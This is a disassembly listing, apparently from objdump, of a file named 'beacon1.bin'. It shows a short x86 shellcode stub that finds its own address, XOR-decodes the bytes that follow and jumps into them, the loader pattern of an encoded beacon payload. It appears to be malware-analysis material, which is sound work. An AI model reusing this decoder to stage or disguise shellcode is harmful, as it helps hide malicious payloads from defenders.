
input/beacon1.bin:     file format binary


Disassembly of section .data:

00000000 <.data>:
       0:	fc                   	cld    
       1:	e8 00 00 00 00       	call   0x6
       6:	eb 2b                	jmp    0x33
       8:	5d                   	pop    %ebp
       9:	8b 55 00             	mov    0x0(%ebp),%edx
       c:	83 c5 04             	add    $0x4,%ebp
       f:	8b 5d 00             	mov    0x0(%ebp),%ebx
      12:	31 d3                	xor    %edx,%ebx
      14:	83 c5 04             	add    $0x4,%ebp
      17:	55                   	push   %ebp
      18:	8b 4d 00             	mov    0x0(%ebp),%ecx
      1b:	31 d1                	xor    %edx,%ecx
      1d:	89 4d 00             	mov    %ecx,0x0(%ebp)
      20:	31 ca                	xor    %ecx,%edx
      22:	83 c5 04             	add    $0x4,%ebp
      25:	83 eb 04             	sub    $0x4,%ebx
      28:	31 c9                	xor    %ecx,%ecx
      2a:	39 cb                	cmp    %ecx,%ebx
      2c:	74 02                	je     0x30
      2e:	eb e8                	jmp    0x18
      30:	5a                   	pop    %edx
      31:	ff e2                	jmp    *%edx
      33:	e8 d0 ff ff ff       	call   0x8
